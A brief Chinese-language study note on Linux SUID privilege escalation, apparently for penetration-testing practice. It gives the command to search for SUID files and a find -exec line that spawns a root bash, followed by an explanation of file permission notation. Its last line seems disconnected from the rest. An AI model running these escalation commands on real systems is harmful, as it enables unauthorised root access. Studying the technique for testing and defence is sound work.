suid:默认会以特权用户的权限去执行

apt | apt-get….

提权步骤:

find / -perm -u=s -type f 2>/dev/null –> 查找具有suid权限的文件

以find命令为例:

find /etc/passwd -exec /bin/bash -p ; –> 利用文件进入root权限的bash

文件权限:
-:代表文件
l:代表链接(软链接–>快捷方式;硬链接–>复制了一份源文件)
d:代表目录
r 4:可读(read)
w 2:可写(write)
x 1:可执行(execution)

d rwx r-x r-x
d:目录
rwx:当前用户的权限
r-x:当前用户组的权限
r-x:其他用户组的权限

不受影响的系统将显示以“ usage：”开头的错误响应。
